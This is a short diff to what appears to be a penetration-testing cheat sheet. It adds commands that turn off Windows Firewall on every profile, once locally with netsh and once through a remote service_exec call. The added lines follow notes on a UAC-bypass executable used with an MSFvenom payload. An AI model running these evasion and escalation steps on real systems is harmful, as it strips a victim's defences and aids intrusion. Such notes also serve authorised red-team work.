@@ -941,6 +941,10 @@ i686-w64-mingw32-gcc evenvwrbypass.c -o eventvwr-bypassuac-32.exe
 Run Executable with listener setup in same directory as MSFvenom payload
 eventvwr-bypassuac-64.exe
 eventvwr-bypassuac-32.exe
+
+# Disable Windows Firewall
+netsh advfirewall set allprofiles state off
+service_exec(conn, r'cmd /c netsh advfirewall set allprofiles state off') 
 ```
 
 #### Credential Access
